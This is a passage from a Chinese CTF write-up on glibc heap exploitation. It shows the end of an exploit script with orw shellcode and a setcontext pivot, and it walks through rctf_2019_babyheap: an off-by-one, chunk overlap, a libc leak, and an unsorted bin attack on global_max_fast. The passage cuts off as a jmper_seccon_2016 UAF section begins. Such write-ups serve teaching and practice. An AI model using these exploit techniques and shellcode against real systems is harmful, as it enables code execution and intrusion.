rsi,&#123;free_hook_addr&#125;</span></span><br><span class="line"><span class="string">mov al,0;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">xor rdi,rdi;</span></span><br><span class="line"><span class="string">mov al,1;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">read_shellcode = f<span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">xor rsi,rsi;</span></span><br><span class="line"><span class="string">xor rdx,rdx;</span></span><br><span class="line"><span class="string">mov rdi,1;</span></span><br><span class="line"><span class="string">mov dx,0xffff;</span></span><br><span class="line"><span class="string">mov rsi,&#123;new_addr&#125;;</span></span><br><span class="line"><span class="string">xor rax,rax;</span></span><br><span class="line"><span class="string">mov al,0;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">mov rax,&#123;new_addr&#125;;</span></span><br><span class="line"><span class="string">jmp rax;</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">edit(</span><br><span class="line">    <span class="number">5</span>,</span><br><span class="line">    b<span class="string">&quot;a&quot;</span> * <span class="number">3</span></span><br><span class="line">    + p64(setcontext_addr + <span class="number">53</span>)</span><br><span class="line">    + p64(free_hook_addr + <span class="number">0x10</span>)</span><br><span class="line">    + <span class="keyword">asm</span>(read_shellcode),</span><br><span class="line">)</span><br><span class="line"><span class="meta"># debug()</span></span><br><span class="line"><span class="built_in">free</span>(<span class="number">3</span>)</span><br><span class="line">s(<span class="keyword">asm</span>(shellcode))</span><br><span class="line">it()</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>这个题目比较不错，网上有很多种不同的利用方式，这里我就介绍我当时大概的利用方式，具体漏洞原因就在题目里面分析啦 <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#rctf_2019_babyheap">rctf_2019_babyheap</a></p>
<h4 id="init"><a href="#init" class="headerlink" title="init"></a>init</h4><p>这是我第一次要这么认真看init,因为开启了挺多保护的<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844426989-5b6be137-7fec-4160-bf4c-518c25cddd74.png#averageHue=%23fffefe&clientId=u9d5fd636-f51f-4&from=paste&id=uf1c8737f&originHeight=22&originWidth=153&originalType=url&ratio=1&rotation=0&showTitle=false&size=1014&status=done&style=none&taskId=ua3c864bf-de2c-4668-b951-d2a425138ab&title=" alt="image.png"><br>这个其实就类似于设置option,1刚好对应的就是global_max_fast,这里就是把global_max_fast设置为0<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844427016-f22abc8f-c86f-4aa0-931b-5eb9aaad314d.png#averageHue=%23f6f4f1&clientId=u9d5fd636-f51f-4&from=paste&id=u8f389070&originHeight=423&originWidth=873&originalType=url&ratio=1&rotation=0&showTitle=false&size=34874&status=done&style=none&taskId=uc5f3e342-9aa2-4a5e-a5c8-aa6210e51eb&title=" alt="image.png"><br>但在我实际做题的时候，global_max_fast是0x10,但起到了禁用效果，因为我们请求的大小会被转化为实际大小，最小也是0x20,（这里不设置0可能是怕和未初始化的时候的0混淆导致重新初始化global_max_fast的值）<br><strong>seccomp</strong><br>不用说了，就是需要利用orw来读flag,无疑增加了一点点难度<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844427020-3e830c78-ae04-4bed-88e0-10ddab79bc2a.png#averageHue=%23fcfcfb&clientId=u9d5fd636-f51f-4&from=paste&id=u76a3d737&originHeight=213&originWidth=445&originalType=url&ratio=1&rotation=0&showTitle=false&size=12427&status=done&style=none&taskId=u48ecdd16-d5cc-4749-9235-8ee181aa4f8&title=" alt="image.png"></p>
<h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><p>add里面不写内容，并且使用calloc,所以说我们之前的那种什么free unsorted bin再malloc不管用，因为calloc会清空堆内容，别的没洞<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844427019-2bce02d1-5425-46fd-8b2b-15f015d32aa2.png#averageHue=%23fdfdfd&clientId=u9d5fd636-f51f-4&from=paste&id=u92841ffb&originHeight=572&originWidth=545&originalType=url&ratio=1&rotation=0&showTitle=false&size=35500&status=done&style=none&taskId=u11c71f53-77d5-4bad-9199-b5751f7aca0&title=" alt="image.png"></p>
<h4 id="free"><a href="#free" class="headerlink" title="free"></a>free</h4><p>没洞，清理的很干净<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844427025-9df39b69-eada-4e90-bdf2-b75f3ac8258f.png#averageHue=%23fcfcfb&clientId=u9d5fd636-f51f-4&from=paste&id=u9c5a6f2f&originHeight=412&originWidth=490&originalType=url&ratio=1&rotation=0&showTitle=false&size=27321&status=done&style=none&taskId=uc3d0d482-abdf-45c1-9ee2-98debb23784&title=" alt="image.png"></p>
<h4 id="show"><a href="#show" class="headerlink" title="show"></a>show</h4><p>没啥好说的，一般的show操作，大概率用来泄露libc</p>
<h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><p>由于前面的洞不多，那么只有可能这个有洞<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844428356-83a1c402-5d90-47c5-9061-21dbdfb70471.png#averageHue=%23fdfdfd&clientId=u9d5fd636-f51f-4&from=paste&id=u0a82ff39&originHeight=389&originWidth=1102&originalType=url&ratio=1&rotation=0&showTitle=false&size=34364&status=done&style=none&taskId=uddfd1869-11e5-40cb-83f0-fc49061b283&title=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844428357-c8d6aa76-3b0d-4600-b34e-f20b3951cfe6.png#averageHue=%23f9f9f8&clientId=u9d5fd636-f51f-4&from=paste&id=u564fb823&originHeight=308&originWidth=484&originalType=url&ratio=1&rotation=0&showTitle=false&size=21110&status=done&style=none&taskId=ua01ad11b-ff92-4d0d-b733-6417529cdc2&title=" alt="image.png"><br>其实他这个read函数没问题，长度也写得对的，但跟read函数出来的有关系，我这里反编译有点问题，这是read出来会执行的代码，rdx是我们的长度，rax是堆地址，明显的off by one<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844428353-2f355955-f652-4d21-a8e3-17359356e91d.png#averageHue=%23272625&clientId=u9d5fd636-f51f-4&from=paste&id=uea6df970&originHeight=49&originWidth=335&originalType=url&ratio=1&rotation=0&showTitle=false&size=7298&status=done&style=none&taskId=u6de4271b-7b5c-4ebf-9646-595e408c6f8&title=" alt="image.png"></p>
<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>到目前位置，题目就只有一个漏洞，off by one,但这个也是很严重的，我们可以利用off by one进行unlink的操作，刚好这里都是unosrted bin,那么可以直接用unsorted bin来unlink,或者对于unsorted bin来说，更好的说法就是unsorted bin的堆块重叠</p>
<h4 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h4><p>这里第四个块本来是为了防止unsorted bin合并到top chunk,但后面因为需要构造一个比较大的堆里面存放srop的内容，所以我就先申请了个比较大的，主要用到的就是前3个堆<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844428353-61124d3d-4fbc-4bdd-9d2c-07a4d20db538.png#averageHue=%23262522&clientId=u9d5fd636-f51f-4&from=paste&id=u970546ad&originHeight=124&originWidth=187&originalType=url&ratio=1&rotation=0&showTitle=false&size=7039&status=done&style=none&taskId=u03147fa0-efb3-44b0-b0dd-bcfd8b27842&title=" alt="image.png"></p>
<h4 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h4><p><strong>free(0)</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(0x18)  # 0</span><br><span class="line">add(0x18)  # 1</span><br><span class="line">add(0xF8)  # 2</span><br><span class="line">add(0x600)  # 3</span><br><span class="line">free(0)</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844428664-a3063343-3d05-4c4b-8816-4ed48ca22fc0.png#averageHue=%23282525&clientId=u9d5fd636-f51f-4&from=paste&id=u5f9b42aa&originHeight=159&originWidth=469&originalType=url&ratio=1&rotation=0&showTitle=false&size=25314&status=done&style=none&taskId=u2a60a207-f201-4fd7-8688-8ed874e693d&title=" alt="image.png"><br>因为对于unsorted bin来说，本身就有合并的操作，所以我们就是利用这个合并来导致泄露libc,当然具体合并也是通过unlink实现</p>
<h4 id="chunk伪造"><a href="#chunk伪造" class="headerlink" title="chunk伪造"></a>chunk伪造</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(1, p64(0) * 2 + p64(0x40))</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844429251-c78e9bca-409d-489c-a03c-4d48cef1ad37.png#averageHue=%23262525&clientId=u9d5fd636-f51f-4&from=paste&id=u559b0eb9&originHeight=110&originWidth=691&originalType=url&ratio=1&rotation=0&showTitle=false&size=21633&status=done&style=none&taskId=u7f4bc987-5bdd-4bfa-859f-cbb674c0a34&title=" alt="image.png"><br>利用off by one修改prev_size,这里选择f8就是因为size刚好是0x100,off by one不会对大小造成影响</p>
<h4 id="合并"><a href="#合并" class="headerlink" title="合并"></a>合并</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(2)</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844429250-8bd35d2a-82c9-43b7-8c51-784d2184c7b3.png#averageHue=%23292625&clientId=u9d5fd636-f51f-4&from=paste&id=u4b55510c&originHeight=169&originWidth=448&originalType=url&ratio=1&rotation=0&showTitle=false&size=23151&status=done&style=none&taskId=u69d848ef-6bde-454e-9976-cb7b879f724&title=" alt="image.png"></p>
<h4 id="泄露libc-1"><a href="#泄露libc-1" class="headerlink" title="泄露libc"></a>泄露libc</h4><p>因为我们idx 1的块还存在，所以只要unsorted bin的fd和bk刚好在我们idx1块内就可以泄露，于是再分配0x18个字节</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(0x18)  # 0</span><br><span class="line">show(1)</span><br><span class="line">libc_base = u64(rld().ljust(8, b&quot;\\0&quot;)) + 0x7F6913DBD000 - 0x7F6914181B78</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844429252-97788aea-9eb4-4759-a646-f3fcbf5166c6.png#averageHue=%23262424&clientId=u9d5fd636-f51f-4&from=paste&id=ub322aed5&originHeight=42&originWidth=259&originalType=url&ratio=1&rotation=0&showTitle=false&size=7153&status=done&style=none&taskId=u5f99177f-5682-469c-b5b5-19c09e4d333&title=" alt="image.png"></p>
<h4 id="再一次堆块重叠"><a href="#再一次堆块重叠" class="headerlink" title="再一次堆块重叠"></a>再一次堆块重叠</h4><p>利用原有的堆块重叠，我们重新做一次重叠，这次目的就是让我们能够修改的size变大，而不仅仅是原来的-x18</p>
<h4 id="收回后续的内存"><a href="#收回后续的内存" class="headerlink" title="收回后续的内存"></a>收回后续的内存</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(0x118)  # 2</span><br></pre></td></tr></table></figure>
<p>这里的2就是后面所有的unsorted bin大小，然后我们再free掉1，因为1刚好就只想的是0x118的头</p>
<h4 id="重叠"><a href="#重叠" class="headerlink" title="重叠"></a>重叠</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(1)</span><br></pre></td></tr></table></figure>
<p>可以看到我们的idx2对整个区域都是有写的权限的<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844429657-6d81f5ac-26a8-411d-a6d6-9614458cd889.png#averageHue=%23262525&clientId=u9d5fd636-f51f-4&from=paste&id=ub5595bef&originHeight=600&originWidth=778&originalType=url&ratio=1&rotation=0&showTitle=false&size=95278&status=done&style=none&taskId=u1960e664-53c1-4e19-9f58-414b8c8ad2d&title=" alt="image.png"></p>
<h4 id="unsorted-bin-attack-1"><a href="#unsorted-bin-attack-1" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h4><p><strong>利用条件</strong></p>
<ul>
<li>可以控制unsorted bin的bk 效果就是往任意地址写入一个较大的值，这个值其实就是unsorted_bin(av)的地址</li>
</ul>
<p><strong>攻击</strong><br>这里就要用到刚才我们构造的堆块重叠，我们在后面的bk可以很轻松的被修改 然后这里大小因为考虑到后面的继续利用，我把0x118(0x120),分成了一个0x28(0x30),一个0xe8(0xf0)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(0x28)  # 1</span><br><span class="line">add(0xE8)  # 4</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844429647-c2c22052-118c-48c7-acf9-0e0c239b44e6.png#averageHue=%23292725&clientId=u9d5fd636-f51f-4&from=paste&id=u24780b64&originHeight=305&originWidth=416&originalType=url&ratio=1&rotation=0&showTitle=false&size=40375&status=done&style=none&taskId=ued72ad98-3b65-42c6-96f9-f4c698c334d&title=" alt="image.png"><br>我们就利用中间这个0x31进行unsorted bin attack</p>
<h4 id="修改unsorted-bin的bk为指定地址"><a href="#修改unsorted-bin的bk为指定地址" class="headerlink" title="修改unsorted bin的bk为指定地址"></a>修改unsorted bin的bk为指定地址</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free(1)</span><br><span class="line">global_max_fast_addr = libc_base + global_max_fast_offset</span><br><span class="line">edit(2, p64(0) + p64(global_max_fast_addr - 0x10))</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844429805-9a011017-ef9d-446e-a6a3-ca7b6b53d094.png#averageHue=%23262525&clientId=u9d5fd636-f51f-4&from=paste&id=u36d9f3bc&originHeight=146&originWidth=460&originalType=url&ratio=1&rotation=0&showTitle=false&size=19275&status=done&style=none&taskId=u87d92168-70e2-42fc-a984-e8d01ec815e&title=" alt="image.png"><br>这里首先我们要伪造unsortedbin的bk指向我们要覆盖的值的周围，这里-0x10的原因跟踪源码的时候就懂了</p>
<h4 id="unsorted-bin-attack-2"><a href="#unsorted-bin-attack-2" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h4><p>再malloc一个同样大小的块(这里一定要大小一样，这个大小是指实际需要的大小，比如说我们最终大小是0x30,这里可以写0x19~0x28)<br>add(0x28)  </p>
<h4 id="跟踪源码"><a href="#跟踪源码" class="headerlink" title="跟踪源码"></a>跟踪源码</h4><p>开始跟踪源码<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844430100-828eb03e-ccff-484a-a815-1f0745203d97.png#averageHue=%23262525&clientId=u9d5fd636-f51f-4&from=paste&id=u1b7e3d86&originHeight=94&originWidth=565&originalType=url&ratio=1&rotation=0&showTitle=false&size=15033&status=done&style=none&taskId=u40a31143-4d45-477e-8f50-a7383425a56&title=" alt="image.png"><br>在__libc_calloc里面没什么好看的，主要还是看_int_malloc<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844430237-d7acc361-7494-4506-bc29-38ac09fb917b.png#averageHue=%23292828&clientId=u9d5fd636-f51f-4&from=paste&id=u40a4ccb0&originHeight=298&originWidth=844&originalType=url&ratio=1&rotation=0&showTitle=false&size=63131&status=done&style=none&taskId=u92987b82-13a2-4ff6-b270-6c8db40debc&title=" alt="image.png"></p>
<h4 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h4><p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844430356-cea9a6f4-9979-4dac-936f-7cdcb6f379a7.png#averageHue=%23282525&clientId=u9d5fd636-f51f-4&from=paste&id=ub9f7e72e&originHeight=57&originWidth=661&originalType=url&ratio=1&rotation=0&showTitle=false&size=13205&status=done&style=none&taskId=ua25a495a-5872-4e8e-99de-3beff72a050&title=" alt="image.png"><br>可以看到global_max_fast只是设置成了0x10,也就是MINI_SIZE,这里肯定不会进入fastbin的判断 进入smallbin<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844430592-e7bdc2b2-107c-488d-a691-18ebc73f9da5.png#averageHue=%232a2927&clientId=u9d5fd636-f51f-4&from=paste&id=u9f0c6a98&originHeight=167&originWidth=562&originalType=url&ratio=1&rotation=0&showTitle=false&size=19305&status=done&style=none&taskId=u053dbc56-f5e5-457e-8fff-8d9ed0ed59d&title=" alt="image.png"><br>由于这个时候的smallbin都是空，所以尝试从unsorted bin里面分配<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844430842-0bb6de60-616d-453d-823a-ac2b6d85760b.png#averageHue=%232b2a28&clientId=u9d5fd636-f51f-4&from=paste&id=u874146dd&originHeight=221&originWidth=943&originalType=url&ratio=1&rotation=0&showTitle=false&size=49957&status=done&style=none&taskId=uf007e2fc-6ade-4dec-afe2-64aba6b89f9&title=" alt="image.png"><br>bck就是我们篡改的指针，因为unsorted bin是fifo，所以会通过bk指针去寻找后面的块<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844431060-26b20394-739e-40d9-bebe-3ea81c5dcede.png#averageHue=%232b2725&clientId=u9d5fd636-f51f-4&from=paste&id=ua05920cd&originHeight=86&originWidth=522&originalType=url&ratio=1&rotation=0&showTitle=false&size=12635&status=done&style=none&taskId=ua1cab9b7-9e54-414b-a0b9-7d97c36c194&title=" alt="image.png"><br>然后check了一下我们最外边这个unsorted bin的size<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844431379-39db2dbb-e2da-439a-b986-bfae0814d31f.png#averageHue=%232c2a29&clientId=u9d5fd636-f51f-4&from=paste&id=u3456ce49&originHeight=113&originWidth=792&originalType=url&ratio=1&rotation=0&showTitle=false&size=25170&status=done&style=none&taskId=ua56b4639-a035-41ce-a746-7ee377cfcb2&title=" alt="image.png"><br>这里有个判断，会用在里面只有一个unsortedbin的情况，但由于我们篡改了指针，所以跳过<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844431779-a746966e-31c7-455d-961d-006c8a265682.png#averageHue=%232d2c2a&clientId=u9d5fd636-f51f-4&from=paste&id=u27bd5d3a&originHeight=105&originWidth=484&originalType=url&ratio=1&rotation=0&showTitle=false&size=16808&status=done&style=none&taskId=u9a086667-880e-4bf3-914e-964189b80f9&title=" alt="image.png"><br>这里会把bck放到main_arena里面去，同时把bck-&gt;fd,也就是bck+0x10的地方填成main_arena的地址，也就是unsorted bin attack的结果，任意地址较大的值,而我们这里吧global_max_fast填写的比较大，就可以使用fastbin attack<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844431751-805b5100-b42f-443a-9030-b6f13d80b8be.png#averageHue=%23282525&clientId=u9d5fd636-f51f-4&from=paste&id=ufff89311&originHeight=59&originWidth=676&originalType=url&ratio=1&rotation=0&showTitle=false&size=14678&status=done&style=none&taskId=uf74deeae-be4e-4d8b-b357-215353bbe7b&title=" alt="image.png"><br>到这里还没有结束 有个check,size就是我们unsorted bin的总大小，nb是实际需要的大小,这里如果相等就表示我们正好分配完了，也必须要后续处理了，就直接结束，如果不一样呢?<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844432697-aeb8f2f4-1053-42be-ba9c-202b3b623fa7.png#averageHue=%232b2a28&clientId=u9d5fd636-f51f-4&from=paste&id=u487278d6&originHeight=157&originWidth=641&originalType=url&ratio=1&rotation=0&showTitle=false&size=26256&status=done&style=none&taskId=u09fb7a1e-d63c-485b-9a0f-99834d41d17&title=" alt="image.png"></p>
<h4 id="当我们需要分配的size小于unsorted-bin大小"><a href="#当我们需要分配的size小于unsorted-bin大小" class="headerlink" title="当我们需要分配的size小于unsorted bin大小"></a>当我们需要分配的size小于unsorted bin大小</h4><p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844432700-ff966e04-def8-4f7c-a500-edafaba8f3a6.png#averageHue=%23181615&clientId=u9d5fd636-f51f-4&from=paste&id=ue55c2101&originHeight=144&originWidth=624&originalType=url&ratio=1&rotation=0&showTitle=false&size=23904&status=done&style=none&taskId=ue34d2c33-7437-4459-9278-8dacb600e50&title=" alt="image.png"><br>如果大小不匹配的话，会把我们这个unsorted bin根据大小尝试放入small bin或者large bin<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844432701-ce651545-7acf-4ee4-ade5-cb3cd2578b38.png#averageHue=%232b2a28&clientId=u9d5fd636-f51f-4&from=paste&id=u8923ee74&originHeight=154&originWidth=583&originalType=url&ratio=1&rotation=0&showTitle=false&size=20616&status=done&style=none&taskId=u044c0922-d627-408a-8217-ec82a5e25f1&title=" alt="image.png"><br>这里我们就正常的把当前的victim放入到small bins里面去，然后会继续寻找unsorted bin<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844432706-d9e20992-926b-4374-981a-71702eb1fabf.png#averageHue=%232c2a29&clientId=u9d5fd636-f51f-4&from=paste&id=u19c7f63f&originHeight=192&originWidth=841&originalType=url&ratio=1&rotation=0&showTitle=false&size=45383&status=done&style=none&taskId=ue6315e03-1adc-4cd7-8e9c-bfa6409ba79&title=" alt="image.png"><br>此时的victim就变成我们刚才伪造的那个地址，但由于那个周围都是0，所以会对victim-&gt;size报错<br>所以要想完成unsorted bin attack,大小也要匹配，匹配了就直接ok</p>
<h4 id="恢复unsorted-bin"><a href="#恢复unsorted-bin" class="headerlink" title="恢复unsorted bin"></a>恢复unsorted bin</h4><p>这里可以看到我们成功的利用了unsorted bin,但可以发现现在无法malloc了，因为我们的unsorted bin结果坏了，我们需要恢复unsroted bin 由于现在fast bin很大，我们基本上很多大小的size都可以进入fastbin<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844432706-0a9cdcfc-3250-4f2b-a057-b01efb0bd73d.png#averageHue=%23f7f5f3&clientId=u9d5fd636-f51f-4&from=paste&id=u09561745&originHeight=81&originWidth=472&originalType=url&ratio=1&rotation=0&showTitle=false&size=11488&status=done&style=none&taskId=ub9f411f4-08ae-4ea1-afec-64fe4c7c620&title=" alt="image.png"><br>这里其实可以利用数组溢出，来修改main_arena里的fd指针 因为fastbinY在bins的上面，完全可以做到溢出的 这也就是我前面分配0xe8的作用，这个的大小刚好满足</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(4)</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844433386-e7b742a2-72a2-4a8b-82e8-7d92e1cc117f.png#averageHue=%23272625&clientId=u9d5fd636-f51f-4&from=paste&id=u88b826c5&originHeight=63&originWidth=547&originalType=url&ratio=1&rotation=0&showTitle=false&size=14190&status=done&style=none&taskId=u8abda54b-4a74-4d4c-8e88-6c1eed8ee92&title=" alt="image.png"><br>同样的进入_int_free,__libc_free没有看头 进入fast_bin的范围<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844433387-cf0892e3-fdfe-4025-9a70-e2596bf35e87.png#averageHue=%23272726&clientId=u9d5fd636-f51f-4&from=paste&id=ucfdd74d5&originHeight=85&originWidth=807&originalType=url&ratio=1&rotation=0&showTitle=false&size=10174&status=done&style=none&taskId=u20ccc59e-c07f-4ea5-9cf5-7715b31e5f2&title=" alt="image.png"><br>可以看到通过计算的fb刚好是我们要修改的地方<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844433664-3bd6071b-891a-4092-b042-f87d92195bd2.png#averageHue=%23282525&clientId=u9d5fd636-f51f-4&from=paste&id=u3ddad2a8&originHeight=107&originWidth=679&originalType=url&ratio=1&rotation=0&showTitle=false&size=23485&status=done&style=none&taskId=ue0bfb134-b6a7-4cfd-ae32-9a8254f9c53&title=" alt="image.png"><br>这里的计算方法就是size&#x2F;&#x2F;16-2 由于这里的下标是13，所以就是(13+2)*0x10&#x3D;0xf0<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844433661-82100a76-21b5-4c46-a88d-3114169245b5.png#averageHue=%23282726&clientId=u9d5fd636-f51f-4&from=paste&id=ufa767ad9&originHeight=145&originWidth=745&originalType=url&ratio=1&rotation=0&showTitle=false&size=21448&status=done&style=none&taskId=ub0458633-fb21-4b40-9ebb-8f96eca24f2&title=" alt="image.png"><br>防止double free<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844433665-7bebe58c-489c-478e-a4cb-cfd56b947a5a.png#averageHue=%23343230&clientId=u9d5fd636-f51f-4&from=paste&id=u5cc5d905&originHeight=26&originWidth=303&originalType=url&ratio=1&rotation=0&showTitle=false&size=2914&status=done&style=none&taskId=ub161cc7d-5cbb-4f81-acae-4b0005ea3bf&title=" alt="image.png"><br>这里就是更新我们当前free的chunk的fd<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844434098-19d73c18-ffa7-4f66-831f-9df585427d0a.png#averageHue=%232e2d2b&clientId=u9d5fd636-f51f-4&from=paste&id=ub95ee70f&originHeight=57&originWidth=894&originalType=url&ratio=1&rotation=0&showTitle=false&size=11442&status=done&style=none&taskId=uc526d7d7-85a7-4c26-91da-db6bf890385&title=" alt="image.png"><br>同时替换main_arena的值为当前的chunk地址<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844434350-65267203-bfdf-42eb-9048-10e1762ad8b5.png#averageHue=%23252524&clientId=u9d5fd636-f51f-4&from=paste&id=u10ea4ccd&originHeight=38&originWidth=446&originalType=url&ratio=1&rotation=0&showTitle=false&size=7349&status=done&style=none&taskId=u8c12d67f-7e31-42b9-8fb3-41c36c0f795&title=" alt="image.png"><br>可以看到unosrted bin的bk再一次进入到了我们可以控制的范围</p>
<h2 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h2><h3 id="jmper-seccon-2016"><a href="#jmper-seccon-2016" class="headerlink" title="jmper_seccon_2016"></a>jmper_seccon_2016</h3><p>漏洞比较明显，一个uaf<br>打longjmp,稍微看一下原来的汇编代码，看看实现<br>这里需要知道一个key<br>由于再实际远程可能tls偏移不一定，我们反向泄露<br>通过泄露加密后的值，然后推算原来的返回地址算出key</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span 